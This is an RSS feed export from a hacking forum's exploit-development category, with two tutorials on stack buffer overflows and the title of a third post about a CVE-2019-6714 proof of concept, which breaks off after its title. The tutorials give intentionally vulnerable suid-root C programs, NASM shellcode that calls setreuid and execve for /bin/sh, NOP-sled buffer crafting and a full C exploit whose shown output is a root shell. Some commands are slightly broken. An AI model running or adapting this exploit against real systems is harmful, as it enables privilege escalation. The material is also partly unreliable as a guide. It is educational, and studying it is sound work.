<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Exploit Development - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/exploit-development/53</link>
    <description>Topics in the &#39;Exploit Development&#39; category </description>
    
      <lastBuildDate>Mon, 10 Jul 2023 00:01:54 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/exploit-development/53.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Overflows Exploitation</title>
          <dc:creator><![CDATA[0xf00]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>The key to writing an exploit is to understand what you actually have to modify to get the program to execute your instructions. This involves working closely with the stack, and architecture of the system “assembly” in order for the exploitation process to take place, However just knowing assembly is not enough, Although it is extremely helpful to know C, The intricacies of exploit development goes beyond understanding the technical aspects. It also requires creativity, and the ability to analyze and discover new vulnerabilities, exploit development is no easy task and often requires advanced techniques and knowledge which make it hard for lone attackers to end up with a working exploit.</p>
<h1><a name="overflows-exploitation-1" class="anchor" href="https://0x00sec.org#overflows-exploitation-1"></a>Overflows Exploitation</h1>
<p>So, let’s start with some fundamentals first  <code>Memory</code> So the principle of exploiting a buffer overflow is to overwrite parts of memory which aren’t supposed to be overwritten by arbitrary input and making the process execute this code. To see how and where an overflow takes place, lets take a look at how memory is organized</p>
<p><code>code segment</code>, data in this segment are assembler instructions that the processor executes. The code execution is non-linear, it can skip code, jump, and call functions on certain conditions. Therefore, we have a pointer called EIP, or instruction pointer. The address where EIP points to always contains the code that will be executed next.</p>
<p><code>data segment</code> , space for variables and dynamic buffers.</p>
<p><code>stack segment</code>, which is used to pass data (arguments) to functions and as a space for variables of functions. The bottom (start) of the stack usually resides at the very end of the virtual memory of a page, and grows down. The assembler command PUSHL will add to the top of the stack, and POPL will remove one item from the top of the stack and put it in a register. For accessing the stack memory directly, there is the stack pointer ESP that points at the top (lowest memory address) of the stack.</p>
<p>Next, Let’s take a look at an example of a simple function written in assembly, A function is a piece of code in the code segment, that is called, performs a task, and then returns to the previous thread of execution. Optionally, arguments can be passed to a function.</p>
<pre><code class="lang-c">memory address		code
0x8054321 &lt;main+x&gt;	pushl $0x0
0x8054322		call $0x80543a0 &lt;function&gt;
0x8054327		ret
0x8054328		leave
...
0x80543a0 &lt;function&gt;	popl %eax
0x80543a1		addl $0xf00,%eax
0x80543a4		ret
</code></pre>
<p>What’s going on here? The main function calls, The variable is <code>0</code>, main pushes it onto the stack, and calls the function. The function gets the variable from the stack using <code>popl</code>. After finishing, it returns to <code>0x80543a0</code>. Commonly, the main function would always push register <code>EBP</code> on the stack, which the function stores, and restores after finishing. This is the frame pointer concept, that allows the function to use own offsets for addressing, which is mostly uninteresting while dealing with exploits.</p>
<p>We just have to know what the stack looks like. At the top, we have the internal buffers and variables of the function. After this, there is the saved <code>EBP</code> register (32 bit, which is 4 bytes), and then the return address, which is again <code>4 bytes</code>. Further down, there are the arguments passed to the function, which are uninteresting to us. In this case, our return address is <code>0x8054327</code>. It is automatically stored on the stack when the function is called. This return address can be  overwritten, and changed to point to any point in memory, if there is an overflow somewhere in the code.</p>
<p>what do you think is generally more safe, a program dynamically linked to its libraries or one statically linked to them?</p>
<pre><code class="lang-c">void foo (void) {
	char small[30];
	gets (small);
	printf("%s\n", small);

}

int main() {
	foo();
	return 0;
}
</code></pre>
<h2><a name="overflowing-the-program-2" class="anchor" href="https://0x00sec.org#overflowing-the-program-2"></a>Overflowing the program</h2>
<pre><code class="lang-sh"># ./f00
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	&lt;- user input
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# ./f00
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- user input
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Segmentation fault (core dumped)
# gdb f00 core
(gdb) info registers
     eax:       0x24          36
     ecx:  0x804852f   134513967
     edx:        0x1           1
     ebx:   0x11a3c8     1156040
     esp: 0xbffffdb8 -1073742408
     ebp:   0x787878     7895160 
              ^^^^^^
</code></pre>
<p><code>EBP</code> is <code>0x787878</code>, this means that we have written more data on the stack than the input buffer could handle. 0x78 is the hex representation of ‘x’. The process had a buffer of 32 bytes maximum size. We have written more data into memory than allocated for user input and therefore overwritten<br>
<code>EBP</code> and the return address with ‘xxxx’, and the process tried to resume execution at address <code>0x787878</code>, which caused it to get a segmentation fault.</p>
<h2><a name="heap-vs-stack-based-overflows-3" class="anchor" href="https://0x00sec.org#heap-vs-stack-based-overflows-3"></a>Heap vs Stack based overflows</h2>
<p>Dynamically allocated variables (those allocated by <code>malloc();</code>  are created on the heap. Unlike the stack, the heap grows upwards on most systems, that is, new variables created on the heap are located at higher memory addresses than older ones. In a simple heap-based buffer overflow attack, an attacker overflows a buffer that is lower on the heap, overwriting other dynamic variables, which can have unexpected and unwanted  effects.</p>
<p>Alternatively, the stack starts at a high memory address and forces its way down to a low memory<br>
address. The actual placement of replacement on the stack are established by the commands<br>
<code>PUSH</code> AND <code>POP</code>, respectively. A value that is Push’ed on to the stack is copied into the memory<br>
location and is pointed to as execution occurs by the stack pointer. The stack pointer will then be decremented as the stack sequentially moves down, making room for the next local variables to be added <code>subl $20,%esp</code>. <code>POP</code> is the reverse of such an event.</p>
<p>Stack based are relatively simple in terms of concept, these include functions such as:<br>
<code>strcat()</code>, <code>sprint()</code>, <code>strcpy()</code>, <code>gets()</code>, etc…</p>
<p>anywhere where unchecked variables are placed into a buffer of fixed length. Buffer overflows can be avoided by using safe alternatives such as <code>snprintf()</code> with the appropriate size parameter, denoted by ‘n’.  showing that the ‘n’ creates the size we want to copy to the buffer, in this instance it’s the complete buffer size, so we don’t go over and create the unwanted overflow, and ultimately execute unwanted arbitrary data.</p>
<h1><a name="end-4" class="anchor" href="https://0x00sec.org#end-4"></a>End</h1>
<p>That’s all for now, I hope you learned something, this article was a quick introduction to the fundamentals of overflows exploitation. The key takeaway is that understanding system architectures and having both fast and slow thinking abilities are essential, Experience plays a significant role in this process. However, if you have a good grasp of the basics, analyzing and breaking down systems won’t be a challenge for you.</p>
            <p><small>6 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/overflows-exploitation/35958">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/overflows-exploitation/35958</link>
          <pubDate>Mon, 10 Jul 2023 00:01:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35958</guid>
          <source url="https://0x00sec.org/t/overflows-exploitation/35958.rss">Overflows Exploitation</source>
        </item>
        <item>
          <title>Exploit Development 101</title>
          <dc:creator><![CDATA[0xf00]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>
<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>This article will describe how to develop exploits to target specific vulnerabilities, There are many challenges that you may face when writing malicious code to target specific vulnerabilities, I will go through several phases of exploit development and arrive at a working exploit.</p>
<h1>
<a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<p>When writing exploits, we often need to find overflows in programs. These bugs often occur in either buffer overflows or stack overflows, and when this happens we look for two things:  our buffer needs to overwrite EIP (the current instruction pointer), and  one of the CPU registers needs to contain our buffer. Any of the x86 CPU registers can store our buffer, so long as we remember which one!</p>
<ul>
<li>By starting with the vulnerable code, we can make the explanation more clear and easy to follow.</li>
</ul>
<pre><code class="lang-auto">void overflow_function (char *str)
{
  char buffer[20];

  strcpy(buffer, str);  // Function that copies str to buffer
}

int main()
{
  char big_string[128];
  int i;

  for(i=0; i &lt; 128; i++)  // Loop 128 times
  {
    big_string[i] = 'A'; // And fill big_string with 'A's
  }
  overflow_function(big_string);
  exit(0);
}
</code></pre>
<p>The function tries to write 128 bytes of data into the 20-byte buffer, the extra 108 bytes spill out, overwriting the stack frame pointer, the return address, and the str pointer function argument. Then, when the function finishes, the program attempts to jump to the return address, which is now filled with As, which is 0x41 in hexadecimal. The program tries to return to this address, causing the EIP to go to 0x41414141, which is basically just some random address that is either in the wrong memory space or contains invalid instructions, causing the program to crash and die. This is called a stack-based overflow, because the overflow is occurring in the stack memory segment.</p>
<p>when overflow_function() is called the stack frame looks something like this:</p>
<pre><code class="lang-auto"> _________          ____________________		 	___________________________
|         |		   |            		|          |      					   |          
| buffer  |-------&gt;|return address (ret)| -------&gt; | Stack frame pointer (sfp) | 
|         |        |            		|          | 						   | 
|_________|        |____________________|          |___________________________| 
       _________________________                              
	  |							|
---&gt;  |  *str (function arg)    | -----&gt; [[[The Rest of the Stack]]]
	  |                         |
	  |_________________________| 
	  
	  										Figure 1 
</code></pre>
<p>The program crashing as a result of a stack-based overflow isn’t really that interesting, but the reason it crashes is. If the return address were controlled and overwritten with something other than 0x41414141, such as an address where actual executable code was located, then the program would “return” to and execute that code instead of dying. And if the data that overflows into the return address is based on user input, such as the value entered in a username field, the return address and the subsequent program execution flow can be controlled by the user.</p>
<p>Because it’s possible to modify the return address to change the flow of execution by overflowing buffers, all that’s needed is something useful to execute. This is where bytecode injection comes into the picture. Bytecode is just a cleverly designed piece of assembly code that is self-contained and can be injected into buffers, The most common piece of bytecode is known as shellcode. This is a piece of bytecode that just spawns a shell. If a suid root program is tricked into executing shellcode, the attacker will have a user shell with root privileges, while the system believes the suid root program is still doing whatever it was supposed to be doing</p>
<p>The function takes a string as its argument and returns a heap-allocated copy of the string with all uppercase letters converted to lowercase. However, no size control takes place and anything more than 64 chars size causes the issue.</p>
<pre><code class="lang-auto">int main(int argc, char *argv[])
{
  char buffer[500];
  strcpy(buffer, argv[1]);
  return 0;
}
</code></pre>
<p>The program really does nothing, except mismanage memory. Now to make it truly vulnerable, the ownership must be changed to the root user, and the suid permission bit must be turned on for the compiled binary:</p>
<pre><code class="lang-auto">$ sudo chown root f00
$ sudo chmod +s f00
$ ls -l f00
-rwsr-sr-x   1 root   users   4933 Sep 5 15:22 f00
</code></pre>
<p>it would work on root’s privileges even if executed by “normal” user. Exploiting<br>
stack buffer overflow vulnerability we can run shell on root’s privileges! How to achieve this? We will write an exploit:<br>
At first we must create special binary code named “shellcode”, which’s purpose will be to give us root privileges, This means the actual address of the shellcode must be known ahead of time, which can be difficult to know in a dynamically changing stack. To make things even harder, the four bytes where the return address is stored in the stack frame must be overwritten with the value of this address. Even if the correct address is known, but the proper location isn’t overwritten, the program will just crash and die. Two techniques are commonly used to assist with this difficult chicanery.</p>
<p>The first is known as a NOP sled (NOP is short for no operation). This is a single byte instruction that does absolutely nothing. These are sometimes used to waste computational cycles for timing purposes and are actually necessary in the Sparc processor architecture due to instruction pipelining. In this case, these NOP instructions are going to be used for a different purpose; they’re going to be used as a fudge factor. By creating a large array (or sled) of these NOP instructions and placing it before the shellcode, if the EIP returns to any address found in the NOP sled, the EIP will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP will slide down the sled to the shellcode, which will execute properly.</p>
<p>The second technique is flooding the end of the buffer with many back-to-back instances of the desired return address. This way, as long as any one of these return addresses overwrites the actual return address, the exploit will work as desired.</p>
<p>Here is a representation of a crafted buffer:</p>
<pre><code class="lang-auto"> __________	         ___________            _________________________
|		   |        |           |          |                         |
| NOP sled |  ---&gt;  | ShellCode |  ---&gt;    | Repeated return address |
|		   |        |           |          |                         |
|__________|        |___________|          |_________________________|

									Figure 2 
</code></pre>
<p>Even using both of these techniques, the approximate location of the buffer in memory must be known in order to guess the proper return address. One technique for approximating the memory location is to use the current stack pointer as a guide. By subtracting an offset from this stack pointer, the relative address of any variable can be obtained. Because, in this vulnerable program, the first element on the stack is the buffer the shellcode is being put into, the proper return address should be the stack pointer, which means the offset should be close to 0. The NOP sled becomes increasingly useful when exploiting more complicated programs, when the offset isn’t 0.</p>
<h2>
<a name="writing-shellcode-3" class="anchor" href="https://0x00sec.org#writing-shellcode-3"></a>Writing shellcode</h2>
<p>The shellcode must be self-contained and must avoid null bytes, because these will end the string. If the shellcode has a null byte in it, a strcpy() function will recognize that as the end of the string. In order to write a piece of shellcode, an understanding of the assembly language of the target processor is needed. In this case, it’s x86 assembly language, and while this book can’t explain x86 assembly in depth, it can explain a few of the salient points needed to write bytecode.</p>
<h3>
<a name="assembly-instructions-4" class="anchor" href="https://0x00sec.org#assembly-instructions-4"></a>Assembly Instructions</h3>
<p>Instructions in nasm-style syntax generally follow the style of:</p>
<p>instruction , <source></p>
<p>The following are some instructions that will be used in the construction of shellcode.</p>
<pre><code class="lang-auto">mov Move instruction Used to set initial values
  	mov &lt;dest&gt;, &lt;src&gt; Move the value from &lt;src&gt; into &lt;dest&gt;

add Add instruction Used to add values
  	add &lt;dest&gt;, &lt;src&gt; Add the value in &lt;src&gt; to &lt;dest&gt;

sub Subtract instruction Used to subtract values
    sub &lt;dest&gt;, &lt;src&gt; Subtract the value in &lt;src&gt; from &lt;dest&gt;

push  Push instruction Used to push values to the stack
  	  push &lt;target&gt; Push the value in &lt;target&gt; to the stack

pop Pop instruction Used to pop values from the stack pop &lt;target&gt;
     Pop a value from the stack into &lt;target&gt; 

</code></pre>
<p><a href="https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279" class="inline-onebox">Programming for Wannabees. Part III. Your first Shell Code</a></p>
<p>In addition to the raw assembly instructions found in the processor, Linux provides the programmer with a set of functions that can be easily executed from assembly. These are known as system calls, and they are triggered by using interrupts. A listing of enumerated system calls can be found in <code>/usr/include/asm/unistd.h</code></p>
<pre><code class="lang-auto">$ head -n 80 /usr/include/asm/unistd.h

#ifndef _ASM_I386_UNISTD_H_
#define _ASM_I386_UNISTD_H_

/*
 * This file contains the system call numbers.
 */

#define __NR_exit                1
#define __NR_fork                2
#define __NR_read                3
...
</code></pre>
<p>Using the few simple assembly instructions explained in the previous section and the system calls found in unistd.h, many different assembly programs and pieces of bytecode can be written to perform many different functions.</p>
<h3>
<a name="shell-spawning-5" class="anchor" href="https://0x00sec.org#shell-spawning-5"></a>Shell-Spawning</h3>
<p>Shell-spawning code is simple code that executes a shell. This code can be converted into shellcode. The two functions that will be needed are execve() and setreuid(), which are system call numbers 11 and 70 respectively. The execve() call is used to actually execute /bin/sh. The setreuid() call is used to restore root privileges, in case they are dropped. Many suid root programs will drop root privileges whenever they can for security reasons, and if these privileges aren’t properly restored in the shellcode, all that will be spawned is a normal user shell.</p>
<p>There’s no need for an exit() function call, because an interactive program is being spawned. An exit() function wouldn’t hurt, but it has been left out of this example, because ultimately the goal is to make this code as small as possible.</p>
<p><code>shell.asm</code></p>
<pre><code class="lang-auto">section .data    ; section declaration

filepath    db   "/bin/shXAAAABBBB"       ; the string

section .text    ; section declaration

global _start ; Default entry point for ELF linking

_start:

; setreuid(uid_t ruid, uid_t euid)

 mov eax, 70       ; put 70 into eax, since setreuid is syscall #70
 mov ebx, 0        ; put 0 into ebx, to set real uid to root
 mov ecx, 0        ; put 0 into ecx, to set effective uid to root
 int 0x80          ; Call the kernel to make the system call happen

; execve(const char *filename, char *const argv [], char *const envp[])

 mov eax, 0        ; put 0 into eax
 mov ebx, filepath ; put the address of the string into ebx
 mov [ebx+7], al   ; put the 0 from eax where the X is in the string
                   ; ( 7 bytes offset from the beginning)
 mov [ebx+8], ebx  ; put the address of the string from ebx where the
                   ; AAAA is in the string ( 8 bytes offset)
 mov [ebx+12], eax ; put the a NULL address (4 bytes of 0) where the
                   ; BBBB is in the string ( 12 bytes offset)
 mov eax, 11       ; Now put 11 into eax, since execve is syscall #11
 lea ecx, [ebx+8]  ; Load the address of where the AAAA was in the
                   ; string into ecx
 lea edx, [ebx+12] ; Load the address of where the BBBB is in the
                   ; string into edx
 int 0x80          ; Call the kernel to make the system call happen
</code></pre>
<p>This code is a little bit more complex than the previous example. The first set of instructions that should look new are these:</p>
<pre><code class="lang-auto">mov [ebx+7], al    ; put the 0 from eax where the X is in the string
                   ; ( 7 bytes offset from the beginning)
mov [ebx+8], ebx   ; put the address of the string from ebx where the
                   ; AAAA is in the string ( 8 bytes offset)
mov [ebx+12], eax  ; put the a NULL address (4 bytes of 0) where the
                   ; BBBB is in the string ( 12 bytes offset)
</code></pre>
<p>The [ebx+7], tells the computer to move the source value into the address found in the EBX register, but offset by 7 bytes from the beginning. The use of the 8-bit AL register instead of the 32-bit EAX register tells the assembler to only move the first byte from the EAX register, instead of all 4 bytes. Because EBX already has the address of the string “/bin/shXAAAABBBB”, this instruction will move a single byte from the EAX register into the string at the seventh position, right over the X, as seen here:</p>
<pre><code class="lang-auto">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
/ b i n / s h X A A  A  A  B  B  B  B
</code></pre>
<p>The next two instructions do the same thing, but they use the full 32-bit registers and offsets that will cause the moved bytes to overwrite “AAAA” and “BBBB” in the string, respectively. Because EBX holds the address of the string, and EAX holds the value of 0, the “AAAA” in the string will be overwritten with the address of the beginning of the string, and “BBBB” will be overwritten with zeros, which is a null address.</p>
<p>The next two instructions that should look new are these:</p>
<pre><code class="lang-auto">lea ecx, [ebx+8]  ; Load the address of where the AAAA was in the
                  ; string into ecx
lea edx, [ebx+12] ; Load the address of where the BBBB is in the
                  ; string into edx
</code></pre>
<p>These are load effective address (lea) instructions, which copy the address of the source into the destination. In this case, they copy the address of “AAAA” in the string into the ECX register, and the address of “BBBB” in the string into the EDX register. This apparent assembly language prestidigitation is needed because the last two arguments for the execve() function need to be pointers of pointers. This means the argument should be an address to an address that contains the final piece of information. In this case, the ECX register now contains an address that points to another address (where “AAAA” was in the string), which in turn points to the beginning of the string. The EDX register similarly contains an address that points to a null address (where “BBBB” was in the string).</p>
<p>Now let’s try to assemble and link this piece of code to see if it works.</p>
<pre><code class="lang-auto">$ nasm -f elf shell.asm
$ ld ld -m elf_i386 -o shell shell.o
$ ./a.out
sh-2.05a$ exit
exit
$ sudo chown root a.out
$ sudo chmod +s a.out
$ ./a.out
sh-2.05a#
</code></pre>
<p>The program spawns a shell as it should. And if the program’s owner is changed to root and the suid permission bit is set, it spawns a root shell, Excellent now let’s extract the shellcode</p>
<pre><code class="lang-auto">objdump -M intel -d shell | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
</code></pre>
<h3>
<a name="avoiding-using-other-segments-6" class="anchor" href="https://0x00sec.org#avoiding-using-other-segments-6"></a>Avoiding Using Other Segments</h3>
<p>The program spawns a shell, but this code is still a long way from being proper shellcode. The biggest problem is that the string is being stored in the data segment. This is fine if a standalone program is being written, but shellcode isn’t a nice executable program — it’s a sliver of code that needs to be injected into a working program to properly execute. The string from the data segment must be stored with the rest of the assembly instructions somehow, and then a way to find the address of this string must be discovered. Worse yet, because the exact memory location of the running shellcode isn’t known, the address must be found relative to the EIP. Luckily, the jmp and call instructions can use addressing relative to the EIP. Both of these instructions can be used to get the address of a string relative to the EIP, found in the same memory space as the executing instructions.</p>
<p>A call instruction will move the EIP to a certain location in memory, just like a jmp instruction, but it will also push the return address onto the stack so the program execution can continue after the call instruction. If the instruction after the call instruction is a string instead of an instruction, the return address that is pushed to the stack could be popped off and used to reference the string instead of being used to return.</p>
<p>It works like this: At the beginning of program execution, the program jumps to the bottom of the code where a call instruction and the string are located; the address of the string will be pushed to the stack when the call instruction is executed. The call instruction jumps the program execution back up to a relative location just below the prior jump instruction, and the string’s address is popped off the stack. Now the program has a pointer to the string and can do its business, while the string can be neatly tucked at the end of the code.</p>
<p>In assembly it looks something like this:</p>
<pre><code class="lang-auto">jmp two
one:
pop ebx
&lt;program code here&gt;
two:
call one
db 'this is a string'
</code></pre>
<p>First the program jumps down to two, and then it calls back up to one, while pushing the return address (which is the address of the string) onto the stack. Then the program pops this address off the stack into EBX, and it can execute whatever code it desires.</p>
<p>The stripped-down shellcode using the call trick to get an address to the string looks something like this:</p>
<p><code>shellcode.asm</code></p>
<pre><code class="lang-auto">BITS 32

; setreuid(uid_t ruid, uid_t euid)

 mov eax, 70        ; put 70 into eax, since setreuid is syscall #70
 mov ebx, 0         ; put 0 into ebx, to set real uid to root
 mov ecx, 0         ; put 0 into ecx, to set effective uid to root
 int 0x80           ; Call the kernel to make the system call happen

 jmp short two      ; Jump down to the bottom for the call trick
one:
 pop ebx            ; pop the "return address" from the stack
                    ; to put the address of the string into ebx

; execve(const char *filename, char *const argv [], char *const envp[])
 mov eax, 0         ; put 0 into eax
 mov [ebx+7], al    ; put the 0 from eax where the X is in the string
                    ; ( 7 bytes offset from the beginning)
 mov [ebx+8], ebx   ; put the address of the string from ebx where the
                    ; AAAA is in the string ( 8 bytes offset)
 mov [ebx+12], eax  ; put a NULL address (4 bytes of 0) where the
                    ; BBBB is in the string ( 12 bytes offset)
 mov eax, 11        ; Now put 11 into eax, since execve is syscall #11
 lea ecx, [ebx+8]   ; Load the address of where the AAAA was in the string
                    ; into ecx
 lea edx, [ebx+12]  ; Load the address of where the BBBB was in the string
                    ; into edx
 int 0x80           ; Call the kernel to make the system call happen
two:
 call one           ; Use a call to get back to the top and get the
 db '/bin/shXAAAABBBB'       ; address of this string
</code></pre>
<p>Still isn’t usable as shellcode yet we need to removing <code>Null Bytes</code>  let’s examine the code in a hex editor</p>
<pre><code class="lang-auto">$ nasm shellcode.asm
$ hexeditor shellcode

00000000 B8 46 00 00 00 BB 00 00 00 00 B9 00 00 00 00 CD .F..............
00000010 80 EB 1C 5B B8 00 00 00 00 88 43 07 89 5B 08 89 ...[......C..[..
00000020 43 0C B8 0B 00 00 00 8D 4B 08 8D 53 0C CD 80 E8 C.......K..S....
00000030 DF FF FF FF 2F 62 69 6E 2F 73 68 58 41 41 41 41 ..../bin/shXAAAA
00000040 42 42 42 42                                     BBBB
</code></pre>
<p>Any null byte in the shellcode (the ones shown in bold) will be considered the end of the string, causing only the first 2 bytes of the shellcode to be copied into the buffer. In order to get the shellcode to copy into buffers properly, all of the null bytes must be eliminated.</p>
<p>Places in the code where the static value of 0 is moved into a register are obvious sources of null bytes in the assembled shellcode. In order to eliminate null bytes and maintain functionality, a method must be devised for getting the static value of 0 into a register without actually using the value 0. One potential option is to move an arbitrary 32-bit number into the register and then subtract that value from the register using the mov and sub instructions.</p>
<pre><code class="lang-auto">mov ebx, 0x11223344
sub ebx, 0x11223344
</code></pre>
<p>While this technique works, it also takes twice as many instructions, making the assembled shellcode larger than necessary. Luckily, there’s a solution that will put the value of 0 into a register using only one instruction: XOR. The XOR instruction performs an exclusive OR operation on the bits in a register.</p>
<p>An exclusive OR transforms bits as follows:</p>
<pre><code class="lang-auto">1 xor 1 = 0
0 xor 0 = 0
1 xor 0 = 1
0 xor 1 = 1
</code></pre>
<p>Because 1 XORed with 1 results in a 0, and 0 XORed with 0 results in a 0, any value XORed with itself will result in 0. So if the XOR instruction is used to XOR the registers with themselves, the value of 0 will be put into each register using only one instruction and avoiding null bytes.  <a href="https://0x00sec.org/t/linux-shellcoding-part-1-0/289" class="inline-onebox">Linux Shellcoding (Part 1.0)</a></p>
<p>Now we’ve have some basic understanding on how to write shellcode and how it’s work  let’s write an exploit</p>
<h2>
<a name="writing-exploit-7" class="anchor" href="https://0x00sec.org#writing-exploit-7"></a>Writing Exploit</h2>
<p>Writing an exploit program to exploit a program will certainly get the job done, but it does put a layer between the prospective hacker and the vulnerable program. The compiler takes care of certain aspects of the exploit, and having to adjust the exploit by making changes to a program removes a certain level of interactivity from the exploit process. In order to really gain a full understanding of this topic, which is so rooted in exploration and experimentation, the ability to quickly try different things is vital. Python print command and bash shell’s command substitution with grave accents are really all that are needed to exploit the vulnerable program.</p>
<p>Python is an interpreted programming language that has a print command that happens to be particularly suited to generating long sequences of characters. Perl can be used to execute instructions on the command line using the -c switch like this:</p>
<pre><code class="lang-auto">$ python3 -c 'print("A"*20)'
$ AAAAAAAAAAAAAAAAAAAA
</code></pre>
<p>This command simply prints the character A 20 times.</p>
<p>Any character, such as nonprintable characters, can also be printed by using \x##, where ## is the hexadecimal value of the character. In the following example, this notation is used to print the character A, which has the hexadecimal value of 0x41.</p>
<pre><code class="lang-auto">$ python3 -c 'print("\x41"*20)'
$ AAAAAAAAAAAAAAAAAAAA
</code></pre>
<p>In each case, the output of the command found between the grave accents is substituted for the command, and the command of uname is executed.</p>
<pre data-code-wrap="sh"><code class="lang-plaintext">$ python3 -c 'import os; os.system("uname -a")'
</code></pre>
<p>All the exploit code really does is get the stack pointer, craft a buffer, and feed that buffer to the vulnerable program. Armed with python, command substitution, and an approximate return address, the work of the exploit code can be done on the command line by simply executing the vulnerable program and using grave accents to substitute a crafted buffer into the first argument.</p>
<p>Next you can run the app in gdb and get the stack address you need to return to<br>
First set a breakpoint right after the strcpy</p>
<pre><code class="lang-auto">(gdb) disassemble main
Dump of assembler code for function main:
   0x0000555555555139 &lt;+0&gt;:     push   %rbp
   0x000055555555513a &lt;+1&gt;:     mov    %rsp,%rbp
   0x000055555555513d &lt;+4&gt;:     sub    $0x210,%rsp
   0x0000555555555144 &lt;+11&gt;:    mov    %edi,-0x204(%rbp)
   0x000055555555514a &lt;+17&gt;:    mov    %rsi,-0x210(%rbp)
   0x0000555555555151 &lt;+24&gt;:    mov    -0x210(%rbp),%rax
   0x0000555555555158 &lt;+31&gt;:    add    $0x8,%rax
   0x000055555555515c &lt;+35&gt;:    mov    (%rax),%rdx
   0x000055555555515f &lt;+38&gt;:    lea    -0x200(%rbp),%rax
   0x0000555555555166 &lt;+45&gt;:    mov    %rdx,%rsi
   0x0000555555555169 &lt;+48&gt;:    mov    %rax,%rdi
   0x000055555555516c &lt;+51&gt;:    call   0x555555555030 &lt;strcpy@plt&gt;
   0x0000555555555171 &lt;+56&gt;:    mov    $0x0,%eax
   0x0000555555555176 &lt;+61&gt;:    leave
   0x0000555555555177 &lt;+62&gt;:    ret

(gdb) b *0x555555555030
Breakpoint 1 at 0x555555555030
(gdb) run   `python3 -c 'print("\x90"*200)'`
Breakpoint 1, 0x0000555555555030 in strcpy@plt ()
(gdb) info register

</code></pre>
<p>The shellcode should then be appended to the NOP sled. It’s quite useful to have the shellcode existing in a file somewhere, so putting the shellcode into a file should be the next step. Because all the bytes are already spelled out in hexadecimal in the beginning of the exploit, these bytes just need to be written to a file</p>
<pre data-code-wrap="sh"><code class="lang-plaintext">$ ./f00  `python3 -c 'print "\x90"*22+"shellcode"'`
sh-2.05a# whoami
root
sh-2.05a#
</code></pre>
<p><code>exploit.c</code></p>
<pre><code class="lang-auto">#include &lt;stdlib.h&gt;

char shellcode[] = "";

unsigned long sp(void)         // This is just a little function
{ __asm__("movl %esp, %eax");} // used to return the stack pointer

int main(int argc, char *argv[])
{
  int i, offset;
  long esp, ret, *addr_ptr;
  char *buffer, *ptr;

  offset = 0;                 // Use an offset of 0
  esp = sp();                 // Put the current stack pointer into esp
  ret = esp - offset;         // We want to overwrite the ret address

  printf("Stack pointer (ESP) : 0x%x\n", esp);
  printf("    Offset from ESP : 0x%x\n", offset);
  printf("Desired Return Addr : 0x%x\n", ret);

// Allocate 600 bytes for buffer (on the heap)
  buffer = malloc(600);

// Fill the entire buffer with the desired ret address
  ptr = buffer;
  addr_ptr = (long *) ptr;
  for(i=0; i &lt; 600; i+=4)
  { *(addr_ptr++) = ret; }


// Fill the first 200 bytes of the buffer with NOP instructions
  for(i=0; i &lt; 200; i++)
  { buffer[i] = '\x90'; }

// Put the shellcode after the NOP sled
  ptr = buffer + 200;
  for(i=0; i &lt; strlen(shellcode); i++)
  { *(ptr++) = shellcode[i]; }

// End the string
  buffer[600-1] = 0;

// Now call the program ./f00 with our crafted buffer as its argument
  execl("./f00", "f00", buffer, 0);

// Free the buffer memory
  free(buffer);

  return 0;
}
</code></pre>
<p>Here are the results of the exploit code’s compilation and subsequent execution:</p>
<pre><code class="lang-auto">$ gcc -o exploit exploit.c
$ ./exploit
Stack pointer (ESP) : 0xfccd89b0
    Offset from ESP : 0x0
Desired Return Addr : 0xfccd89b0
sh-2.05a# whoami
root
sh-2.05a#
</code></pre>
<p>Apparently it worked. The return address in the stack frame was overwritten with the value 0xfccd89b0, which happens to be the address of the NOP sled and shellcode. Because the program was suid root, and the shellcode was designed to spawn a user shell, the vulnerable program executed the shellcode as the root user.</p>
<h1>
<a name="end-8" class="anchor" href="https://0x00sec.org#end-8"></a>End</h1>
<p>That’s all for now. I hope you learned something from this, This is a big topic, and this is just a little bit of what it covers. Hopefully, you’re now familiar with the concept of stack-based overflows, shellcode and you can recognize some basic Assembly instructions.</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/exploit-development-101/34164">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/exploit-development-101/34164</link>
          <pubDate>Mon, 27 Mar 2023 03:02:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-34164</guid>
          <source url="https://0x00sec.org/t/exploit-development-101/34164.rss">Exploit Development 101</source>
        </item>
        <item>
          <title>Modified CVE-2019-6714 PoC to execute payload via mshta.exe</title>
          <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
